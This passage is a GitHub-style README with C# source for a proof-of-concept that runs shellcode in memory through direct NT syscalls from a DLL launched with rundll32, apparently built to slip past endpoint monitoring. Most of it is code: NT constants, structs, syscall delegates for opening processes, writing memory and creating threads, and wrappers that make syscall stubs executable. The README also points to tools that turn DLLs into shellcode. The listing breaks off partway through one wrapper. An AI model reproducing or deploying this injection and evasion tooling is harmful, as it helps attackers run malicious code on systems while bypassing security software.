# ExecuteShellcodeWithSyscalls
Execute shellcode with syscalls from C# .dll

Compile with csc.exe (https://github.com/mobdk/compilecs) and insert entrypoint exec. As time writing this support Windows 10 1803/17134 1809/17763	1903/18362 1909/18363, servers can be added. 

For finding syscalls identifer goto https://j00ru.vexillium.org/syscalls/nt/64/

This PoC execute calc.exe. I recommend  https://github.com/monoxgas/sRDI/blob/master/PowerShell/ConvertTo-Shellcode.ps1 for
converting C coded .dll into shellcode, works both with 32/64bit

Execution example:

Ordinal number:
rundll32 syscalls.dll,#1

Entrypoint exec:
rundll32 syscalls.dll,exec

syscalls.cs:

```

using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;




public class Code
{

    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const int FILE_READ_DATA = 0x0001;
    public const int FILE_LIST_DIRECTORY = 0x0001;
    public const int FILE_WRITE_DATA = 0x0002;
    public const int FILE_ADD_FILE = 0x0002;
    public const int FILE_APPEND_DATA = 0x0004;
    public const int FILE_ADD_SUBDIRECTORY = 0x0004;
    public const int FILE_CREATE_PIPE_INSTANCE = 0x0004;
    public const int FILE_READ_EA = 0x0008;
    public const int FILE_WRITE_EA = 0x0010;
    public const int FILE_EXECUTE = 0x0020;
    public const int FILE_TRAVERSE = 0x0020;
    public const int FILE_DELETE_CHILD = 0x0040;
    public const int FILE_READ_ATTRIBUTES = 0x0080;
    public const int FILE_WRITE_ATTRIBUTES = 0x0100;
    public const int FILE_OVERWRITE_IF = 0x00000005;
    public const int FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020;
    public const long READ_CONTROL = 0x00020000;
    public const long SYNCHRONIZE = 0x00100000;
    public const long STANDARD_RIGHTS_WRITE = READ_CONTROL;
    public const long STANDARD_RIGHTS_EXECUTE = READ_CONTROL;
    public const long STANDARD_RIGHTS_ALL = 0x001F0000;
    public const long SPECIFIC_RIGHTS_ALL = 0x0000FFFF;
    public const long FILE_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1FF;
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const UInt32 TOKEN_DUPLICATE = 0x0002;
    public const UInt32 TOKEN_IMPERSONATE = 0x0004;
    public const UInt32 TOKEN_QUERY = 0x0008;
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
    public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID);
    public const UInt32 TOKEN_ALT = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);
    public const UInt32 SE_PRIVILEGE_ENABLED = 0x2;
    public const long FILE_GENERIC_READ = STANDARD_RIGHTS_READ | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | SYNCHRONIZE;
    public const long FILE_GENERIC_WRITE = STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE;
    public const long FILE_GENERIC_EXECUTE = STANDARD_RIGHTS_EXECUTE | FILE_READ_ATTRIBUTES | FILE_EXECUTE | SYNCHRONIZE;
    public const int FILE_SHARE_READ = 0x00000001;
    public const int FILE_SHARE_WRITE = 0x00000002;
    public const int FILE_SHARE_DELETE = 0x00000004;
    public const int FILE_ATTRIBUTE_READONLY = 0x00000001;
    public const int FILE_ATTRIBUTE_HIDDEN = 0x00000002;
    public const int FILE_ATTRIBUTE_SYSTEM = 0x00000004;
    public const int FILE_ATTRIBUTE_DIRECTORY = 0x00000010;
    public const int FILE_ATTRIBUTE_ARCHIVE = 0x00000020;
    public const int FILE_ATTRIBUTE_DEVICE = 0x00000040;
    public const int FILE_ATTRIBUTE_NORMAL = 0x00000080;
    public const int FILE_ATTRIBUTE_TEMPORARY = 0x00000100;
    public const int FILE_ATTRIBUTE_SPARSE_FILE = 0x00000200;
    public const int FILE_ATTRIBUTE_REPARSE_POINT = 0x00000400;
    public const int FILE_ATTRIBUTE_COMPRESSED = 0x00000800;
    public const int FILE_ATTRIBUTE_OFFLINE = 0x00001000;
    public const int FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 0x00002000;
    public const int FILE_ATTRIBUTE_ENCRYPTED = 0x00004000;
    public const int FILE_NOTIFY_CHANGE_FILE_NAME = 0x00000001;
    public const int FILE_NOTIFY_CHANGE_DIR_NAME = 0x00000002;
    public const int FILE_NOTIFY_CHANGE_ATTRIBUTES = 0x00000004;
    public const int FILE_NOTIFY_CHANGE_SIZE = 0x00000008;
    public const int FILE_NOTIFY_CHANGE_LAST_WRITE = 0x00000010;
    public const int FILE_NOTIFY_CHANGE_LAST_ACCESS = 0x00000020;
    public const int FILE_NOTIFY_CHANGE_CREATION = 0x00000040;
    public const int FILE_NOTIFY_CHANGE_SECURITY = 0x00000100;
    public const int FILE_ACTION_ADDED = 0x00000001;
    public const int FILE_ACTION_REMOVED = 0x00000002;
    public const int FILE_ACTION_MODIFIED = 0x00000003;
    public const int FILE_ACTION_RENAMED_OLD_NAME = 0x00000004;
    public const int FILE_ACTION_RENAMED_NEW_NAME = 0x00000005;
    public const int MAILSLOT_NO_MESSAGE = -1;
    public const int MAILSLOT_WAIT_FOREVER = -1;
    public const int FILE_CASE_SENSITIVE_SEARCH = 0x00000001;
    public const int FILE_CASE_PRESERVED_NAMES = 0x00000002;
    public const int FILE_UNICODE_ON_DISK = 0x00000004;
    public const int FILE_PERSISTENT_ACLS = 0x00000008;
    public const int FILE_FILE_COMPRESSION = 0x00000010;
    public const int FILE_VOLUME_QUOTAS = 0x00000020;
    public const int FILE_SUPPORTS_SPARSE_FILES = 0x00000040;
    public const int FILE_SUPPORTS_REPARSE_POINTS = 0x00000080;
    public const int FILE_SUPPORTS_REMOTE_STORAGE = 0x00000100;
    public const int FILE_VOLUME_IS_COMPRESSED = 0x00008000;
    public const int FILE_SUPPORTS_OBJECT_IDS = 0x00010000;
    public const int FILE_SUPPORTS_ENCRYPTION = 0x00020000;
    public const int FILE_NAMED_STREAMS = 0x00040000;
    public const int FILE_READ_ONLY_VOLUME = 0x00080000;
    public const int CREATE_ALWAYS = 2;
    public const uint GENERIC_ALL = 0x1FFFFF;
    const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
    const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct NtCreateThreadExBuffer
    {
        public int Size;
        public uint Unknown1;
        public uint Unknown2;
        public IntPtr Unknown3;
        public uint Unknown4;
        public uint Unknown5;
        public uint Unknown6;
        public IntPtr Unknown7;
        public uint Unknown8;
    };

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct OSVERSIONINFOEXW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
        public UInt16 wServicePackMajor;
        public UInt16 wServicePackMinor;
        public UInt16 wSuiteMask;
        public byte wProductType;
        public byte wReserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LARGE_INTEGER
    {
        public UInt32 LowPart;
        public UInt32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO
    {
        public uint dwOem;
        public uint dwPageSize;
        public IntPtr lpMinAppAddress;
        public IntPtr lpMaxAppAddress;
        public IntPtr dwActiveProcMask;
        public uint dwNumProcs;
        public uint dwProcType;
        public uint dwAllocGranularity;
        public ushort wProcLevel;
        public ushort wProcRevision;
    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public ulong Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public ulong Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    public enum NTSTATUS : uint
    {
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,
        MaximumNtStatus = 0xffffffff
};

    [Flags]
    public enum MemoryProtection : uint
    {
        AccessDenied = 0x0,
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        Guard = 0x100,
        NoCache = 0x200,
        WriteCombine = 0x400,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        //SEC_NO_CHANGE = 0x00400000
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern bool ZwOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);

    [DllImport("ntdll.dll")]
    public static extern NTSTATUS ZwProtectVirtualMemory( [In] IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, [In] MemoryProtection NewProtect, [Out] out MemoryProtection OldProtect );

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList( IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute( IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwOpenProcessX(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwWriteVirtualMemoryX(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwAllocateVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwCreateThreadExX(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwCreateSectionX(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwMapViewOfSectionX(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwProtectVirtualMemoryX(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwCreateProcessX( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwOpenThreadX( IntPtr threadHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwResumeThreadX( IntPtr threadHandle, out ulong SuspendCount);


    public static NTSTATUS ZwOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 1 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwOpenProcessX ZwOpenProcessFunc = (ZwOpenProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessX));
                return (NTSTATUS)ZwOpenProcessFunc(out hProcess, processAccess, objAttribute, ref clientid);
            }

        }
    }

    public static NTSTATUS ZwCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 2 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
